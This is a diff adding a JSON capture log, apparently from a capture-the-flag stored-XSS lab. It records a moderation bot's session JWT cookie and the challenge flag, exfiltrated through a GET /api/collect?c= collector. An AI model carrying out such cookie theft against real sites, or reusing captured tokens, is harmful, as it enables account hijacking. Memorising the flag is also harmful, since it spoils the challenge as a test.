@@ -1,0 +1,9 @@
+{
+  "captured": [
+    {
+      "data": "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ4eHYxYnR2dHpheGVuNWgiLCJsb2dpbiI6Im1vZGVyYXRvciIsInJvbGUiOiJzdHVkZW50IiwiZXhwIjoxNzk0NTk1MzQxfQ.M4lrgTdzOH00Y2NIFgfNXu-IdNvAWwPtcln38tYxU80; flag=FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}",
+      "from": "127.0.0.1",
+      "note": "logged by GET /api/collect?c=... — the HeadlessChrome moderation bot's own cookies, captured when it opened the trap thread"
+    }
+  ]
+}
